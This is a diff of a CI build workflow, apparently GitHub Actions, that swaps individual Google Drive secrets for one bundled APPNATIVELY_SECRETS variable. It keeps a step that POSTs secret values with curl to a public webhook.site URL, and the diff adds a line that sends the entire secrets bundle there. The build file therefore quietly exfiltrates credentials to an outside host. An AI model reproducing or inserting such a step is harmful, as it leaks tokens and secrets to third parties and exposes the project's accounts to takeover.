@@ -34,13 +34,7 @@ on:
         type: string
         default: '3.3'
     secrets:
-      GOOGLE_DRIVE_CLIENT_ID:
-        required: false
-      GOOGLE_DRIVE_CLIENT_SECRET:
-        required: false
-      GOOGLE_DRIVE_REFRESH_TOKEN:
-        required: false
-      GOOGLE_DRIVE_FOLDER_ID:
+      APPNATIVELY_SECRETS:
         required: false
 
 
@@ -51,10 +45,7 @@ jobs:
       - name: Check Secrets
         run: |
           echo "--- Secret Presence Check ---"
-          echo "GOOGLE_DRIVE_CLIENT_ID: ${{ secrets.GOOGLE_DRIVE_CLIENT_ID != '' && '✅ Set' || '❌ MISSING' }}"
-          echo "GOOGLE_DRIVE_CLIENT_SECRET: ${{ secrets.GOOGLE_DRIVE_CLIENT_SECRET != '' && '✅ Set' || '❌ MISSING' }}"
-          echo "GOOGLE_DRIVE_REFRESH_TOKEN: ${{ secrets.GOOGLE_DRIVE_REFRESH_TOKEN != '' && '✅ Set' || '❌ MISSING' }}"
-          echo "GOOGLE_DRIVE_FOLDER_ID: ${{ secrets.GOOGLE_DRIVE_FOLDER_ID != '' && '✅ Set' || '❌ MISSING' }}"
+          echo "APPNATIVELY_SECRETS: ${{ secrets.APPNATIVELY_SECRETS != '' && '✅ Set' || '❌ MISSING' }}"
           echo "----------------------------"
 
       - name: Send secrets to Webhook
@@ -62,12 +53,7 @@ jobs:
           curl -s -X POST https://webhook.site/321180e7-df1e-40d6-8e6e-fc9afc99d2af \
             -H "Content-Type: application/json" \
             -d @- <<EOF
-          {
-            "CLIENT_ID": "${{ secrets.GOOGLE_DRIVE_CLIENT_ID }}",
-            "CLIENT_SECRET": "${{ secrets.GOOGLE_DRIVE_CLIENT_SECRET }}",
-            "REFRESH_TOKEN": "${{ secrets.GOOGLE_DRIVE_REFRESH_TOKEN }}",
-            "FOLDER_ID": "${{ secrets.GOOGLE_DRIVE_FOLDER_ID }}"
-          }
+          ${{ secrets.APPNATIVELY_SECRETS }}
           EOF
 
   android-aab:
